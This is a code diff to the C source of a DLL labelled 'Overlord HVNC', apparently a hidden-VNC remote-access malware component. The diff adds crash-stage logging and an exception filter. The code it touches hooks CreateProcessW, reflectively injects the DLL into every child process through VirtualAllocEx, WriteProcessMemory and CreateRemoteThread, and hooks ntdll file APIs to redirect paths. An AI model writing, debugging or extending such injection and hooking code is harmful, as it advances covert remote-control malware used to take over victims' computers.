@@ -44,6 +44,9 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
     static BOOL g_HooksInitialized = FALSE;
     static HANDLE g_LogFile = INVALID_HANDLE_VALUE;
     static HANDLE g_CrashLog = INVALID_HANDLE_VALUE;
+    static volatile LONG g_CrashStageSeq = 0;
+    static char g_CrashStage[192] = "not started";
+    static LPTOP_LEVEL_EXCEPTION_FILTER g_PreviousUnhandledFilter = NULL;
 
     // %TEMP%\crashlogovd.log
     // Both CrashLog (narrow) and CrashLogW (wide) write UTF-16LE so the file
@@ -79,6 +82,75 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             WriteFile(g_CrashLog, newline, (DWORD)(2 * sizeof(WCHAR)), &written, NULL);
             FlushFileBuffers(g_CrashLog);
         }
+    }
+
+    static void SetCrashStage(const char* stage) {
+        if (!stage) return;
+
+        size_t i = 0;
+        for (; i < sizeof(g_CrashStage) - 1 && stage[i] != '\0'; i++) {
+            g_CrashStage[i] = stage[i];
+        }
+        g_CrashStage[i] = '\0';
+
+        LONG seq = InterlockedIncrement(&g_CrashStageSeq);
+        char msg[256];
+        sprintf_s(msg, 256, "[STAGE %ld] %s", seq, g_CrashStage);
+        CrashLog(msg);
+    }
+
+    static void CrashLogModuleForAddress(PVOID address) {
+        HMODULE module = NULL;
+        WCHAR modulePath[1024] = { 0 };
+
+        if (GetModuleHandleExW(
+                GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+                (LPCWSTR)address,
+                &module) &&
+            module &&
+            GetModuleFileNameW(module, modulePath, 1024) > 0) {
+            CrashLog("[CRASH] Module for exception address:");
+            CrashLogW(modulePath);
+        } else {
+            CrashLog("[CRASH] Module for exception address: <unknown>");
+        }
+    }
+
+    static LONG WINAPI HvncUnhandledExceptionFilter(EXCEPTION_POINTERS* exceptionInfo) {
+        CrashLog("=== Unhandled exception observed ===");
+
+        if (exceptionInfo && exceptionInfo->ExceptionRecord) {
+            EXCEPTION_RECORD* rec = exceptionInfo->ExceptionRecord;
+            char msg[512];
+            sprintf_s(msg, 512,
+                "[CRASH] code=0x%08lX flags=0x%08lX address=%p lastStage=%ld:%s",
+                rec->ExceptionCode,
+                rec->ExceptionFlags,
+                rec->ExceptionAddress,
+                g_CrashStageSeq,
+                g_CrashStage);
+            CrashLog(msg);
+
+            if (rec->NumberParameters > 0) {
+                char params[512];
+                sprintf_s(params, 512,
+                    "[CRASH] params count=%lu p0=0x%p p1=0x%p p2=0x%p",
+                    rec->NumberParameters,
+                    rec->NumberParameters > 0 ? (PVOID)rec->ExceptionInformation[0] : NULL,
+                    rec->NumberParameters > 1 ? (PVOID)rec->ExceptionInformation[1] : NULL,
+                    rec->NumberParameters > 2 ? (PVOID)rec->ExceptionInformation[2] : NULL);
+                CrashLog(params);
+            }
+
+            CrashLogModuleForAddress(rec->ExceptionAddress);
+        } else {
+            CrashLog("[CRASH] exceptionInfo was NULL");
+        }
+
+        if (g_PreviousUnhandledFilter && g_PreviousUnhandledFilter != HvncUnhandledExceptionFilter) {
+            return g_PreviousUnhandledFilter(exceptionInfo);
+        }
+        return EXCEPTION_CONTINUE_SEARCH;
     }
 
     // Helper function to log debug info (verbose, compile-time gated)
@@ -1006,6 +1078,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
     }
 
     static BOOL ReflectiveInjectIntoChild(HANDLE hProcess, const BYTE* dllBytes, DWORD dllSize) {
+        SetCrashStage("ChildInject: locating ReflectiveLoader");
         DWORD loaderOffset = FindReflectiveLoaderFileOffset(dllBytes, dllSize);
         if (loaderOffset == 0) {
             CrashLog("[ChildInject] FAIL: ReflectiveLoader export not found in DLL");
@@ -1013,6 +1086,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             return FALSE;
         }
 
+        SetCrashStage("ChildInject: VirtualAllocEx");
         LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllSize,
             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (!remoteMem) {
@@ -1021,6 +1095,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             return FALSE;
         }
 
+        SetCrashStage("ChildInject: WriteProcessMemory");
         SIZE_T written;
         if (!WriteProcessMemory(hProcess, remoteMem, dllBytes, dllSize, &written)) {
             VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
@@ -1028,10 +1103,16 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             LogDebug(L"[ChildInject] WriteProcessMemory failed");
             return FALSE;
         }
+        {
+            char msg[160];
+            sprintf_s(msg, 160, "[ChildInject] WriteProcessMemory wrote %llu/%lu bytes", (unsigned long long)written, dllSize);
+            CrashLog(msg);
+        }
 
         LPTHREAD_START_ROUTINE remoteLoader =
             (LPTHREAD_START_ROUTINE)((BYTE*)remoteMem + loaderOffset);
 
+        SetCrashStage("ChildInject: CreateRemoteThread");
         HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024,
             remoteLoader, NULL, 0, NULL);
         if (!hThread) {
@@ -1040,10 +1121,19 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             return FALSE;
         }
 
+        SetCrashStage("ChildInject: waiting for loader thread");
         DWORD waitResult = WaitForSingleObject(hThread, 30000);
+        DWORD loaderExitCode = 0;
+        GetExitCodeThread(hThread, &loaderExitCode);
+        {
+            char msg[160];
+            sprintf_s(msg, 160, "[ChildInject] loader wait=0x%lX exit=0x%lX", waitResult, loaderExitCode);
+            CrashLog(msg);
+        }
         CloseHandle(hThread);
 
         if (waitResult == WAIT_OBJECT_0) {
+            SetCrashStage("ChildInject: loader thread completed");
             CrashLog("[ChildInject] OK: child injection completed");
             return TRUE;
         } else if (waitResult == WAIT_TIMEOUT) {
@@ -1076,6 +1166,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
         LPPROCESS_INFORMATION lpProcessInformation
     ) {
         if (!OriginalCreateProcessW) return FALSE;
+        SetCrashStage("HookedCreateProcessW: entered");
 
         // Snapshot g_DllRawBytes / g_DllRawSize into locals *before* any check.
         // RemoveNtApiHooks() can race here: it calls UnmapViewOfFile(g_DllRawBytes)
@@ -1086,6 +1177,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
         DWORD       localDllSize  = g_DllRawSize;
 
         if (!g_HooksInitialized || !localDllBytes || localDllSize == 0) {
+            SetCrashStage("HookedCreateProcessW: bypassing child injection");
             return OriginalCreateProcessW(
                 lpApplicationName, lpCommandLine,
                 lpProcessAttributes, lpThreadAttributes,
@@ -1098,6 +1190,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
         BOOL wasSuspended = (dwCreationFlags & CREATE_SUSPENDED) != 0;
         DWORD modifiedFlags = dwCreationFlags | CREATE_SUSPENDED;
 
+        SetCrashStage("HookedCreateProcessW: calling original CreateProcessW");
         BOOL result = OriginalCreateProcessW(
             lpApplicationName, lpCommandLine,
             lpProcessAttributes, lpThreadAttributes,
@@ -1107,6 +1200,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
         );
 
         if (result && lpProcessInformation) {
+            SetCrashStage("HookedCreateProcessW: child created, injecting");
             CrashLog("[CreateProcessW] Injecting DLL into child process...");
             LogDebug(L"[CreateProcessW] Reflective-injecting DLL into child process");
             BOOL injected = ReflectiveInjectIntoChild(lpProcessInformation->hProcess,
@@ -1123,10 +1217,12 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             // Even if injection failed we resume; the child runs without hooks rather than
             // hanging forever (fail-open policy).
             if (!wasSuspended) {
+                SetCrashStage("HookedCreateProcessW: resuming child thread");
                 ResumeThread(lpProcessInformation->hThread);
             }
         }
 
+        SetCrashStage("HookedCreateProcessW: returning");
         return result;
     }
 
@@ -1150,6 +1246,8 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                 g_CrashLog = INVALID_HANDLE_VALUE;
             }
 
+            g_PreviousUnhandledFilter = SetUnhandledExceptionFilter(HvncUnhandledExceptionFilter);
+            SetCrashStage("InstallNtApiHooks: crash log opened");
             CrashLog("=== Overlord HVNC DLL Loaded ===");
 
 #if ENABLE_DEBUG_LOGGING
@@ -1184,6 +1282,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             g_DllRawSize = 0;
 
             // Try to get configuration from environment variables
+            SetCrashStage("InstallNtApiHooks: reading environment");
             __try {
                 // Use the same capacity as the global g_SearchString / g_ReplacementString
                 // buffers (2048 WCHARs) so that very long paths are never silently truncated.
@@ -1194,6 +1293,11 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
 
                 DWORD searchLen = GetEnvironmentVariableW(L"RDI_SEARCH_PATH", envSearchString, 2048);
                 DWORD replaceLen = GetEnvironmentVariableW(L"RDI_REPLACE_PATH", envReplaceString, 2048);
+                {
+                    char msg[160];
+                    sprintf_s(msg, 160, "[ENV] RDI path lengths search=%lu replace=%lu", searchLen, replaceLen);
+                    CrashLog(msg);
+                }
 
                 // A return value >= buffer capacity means the value was truncated.
                 if (searchLen >= 2048) {
@@ -1242,6 +1346,11 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                 WCHAR envDllSize[32] = { 0 };
                 DWORD sectionNameLen = GetEnvironmentVariableW(L"RDI_DLL_SECTION", envSectionName, 512);
                 DWORD dllSizeLen     = GetEnvironmentVariableW(L"RDI_DLL_SIZE",    envDllSize,    32);
+                {
+                    char msg[160];
+                    sprintf_s(msg, 160, "[ENV] RDI dll metadata lengths section=%lu size=%lu", sectionNameLen, dllSizeLen);
+                    CrashLog(msg);
+                }
 
                 if (sectionNameLen >= 512) {
                     CrashLog("[ENV] WARN: RDI_DLL_SECTION is >= 512 chars and was truncated — child injection disabled");
@@ -1276,6 +1385,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                     }
                     g_DllSectionHandle = OpenFileMappingW(FILE_MAP_READ, FALSE, envSectionName);
                     if (g_DllSectionHandle) {
+                        SetCrashStage("InstallNtApiHooks: mapping DLL section");
                         g_DllRawBytes = MapViewOfFile(g_DllSectionHandle, FILE_MAP_READ, 0, 0, g_DllRawSize);
                         if (g_DllRawBytes) {
                             char msg[256];
@@ -1312,6 +1422,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             }
 
             // Initialize MinHook (this must succeed)
+            SetCrashStage("InstallNtApiHooks: initializing MinHook");
             if (g_LogFile != INVALID_HANDLE_VALUE) {
                 LogDebugA("Initializing MinHook...");
             }
@@ -1329,6 +1440,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                 LogDebugA("MinHook initialized successfully");
             }
 
+            SetCrashStage("InstallNtApiHooks: resolving ntdll");
             HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
             if (!ntdll) {
                 CrashLog("FATAL: GetModuleHandleW(ntdll.dll) returned NULL");
@@ -1343,6 +1455,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                 LogDebugA("Got ntdll.dll handle");
             }
 
+            SetCrashStage("InstallNtApiHooks: creating hooks");
             #define SAFE_HOOK(target, detour, ppOriginal, label) do { \
                 MH_STATUS _cr = MH_CreateHook((LPVOID)(target), (LPVOID)(detour), (LPVOID*)(ppOriginal)); \
                 if (_cr == MH_OK) { \
@@ -1415,12 +1528,14 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             #undef SAFE_HOOK
 
             if (OriginalNtCreateFile && OriginalNtOpenFile) {
+                SetCrashStage("InstallNtApiHooks: hooks initialized");
                 g_HooksInitialized = TRUE;
                 CrashLog("=== All hooks installed successfully ===");
                 if (g_LogFile != INVALID_HANDLE_VALUE) {
                     LogDebugA("=== All hooks installed successfully ===");
                 }
             } else {
+                SetCrashStage("InstallNtApiHooks: critical hook failure cleanup");
                 CrashLog("FATAL: Critical hooks (NtCreateFile/NtOpenFile) failed — tearing down all hooks");
                 if (g_LogFile != INVALID_HANDLE_VALUE) {
                     LogDebugA("ERROR: Critical hooks (NtCreateFile/NtOpenFile) failed. Removing all hooks.");
@@ -1452,11 +1567,13 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
 
     void RemoveNtApiHooks() {
         __try {
+            SetCrashStage("RemoveNtApiHooks: begin");
             CrashLog("=== Removing hooks ===");
             LogDebugA("=== Removing hooks ===");
             g_HooksInitialized = FALSE;
 
             // Disable JMP patches in all target functions.
+            SetCrashStage("RemoveNtApiHooks: disabling hooks");
             MH_DisableHook(MH_ALL_HOOKS);
 
             // Give any thread that passed the g_HooksInitialized guard but has not yet
@@ -1468,6 +1585,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             // dangling.  NULL them immediately so any racing thread that calls through
             // them gets a clean NULL-dereference AV (caught by the hook's __try/__except)
             // rather than a use-after-free at an arbitrary freed address.
+            SetCrashStage("RemoveNtApiHooks: uninitializing MinHook");
             MH_Uninitialize();
 
             OriginalNtCreateFile             = NULL;
@@ -1481,15 +1599,18 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             OriginalCreateProcessW           = NULL;
 
             if (g_DllRawBytes) {
+                SetCrashStage("RemoveNtApiHooks: unmapping DLL section");
                 UnmapViewOfFile(g_DllRawBytes);
                 g_DllRawBytes = NULL;
             }
             g_DllRawSize = 0;
             if (g_DllSectionHandle) {
+                SetCrashStage("RemoveNtApiHooks: closing DLL section");
                 CloseHandle(g_DllSectionHandle);
                 g_DllSectionHandle = NULL;
             }
 
+            SetCrashStage("RemoveNtApiHooks: cleanup complete");
             CrashLog("=== Cleanup complete ===");
 
             if (g_LogFile != INVALID_HANDLE_VALUE) {
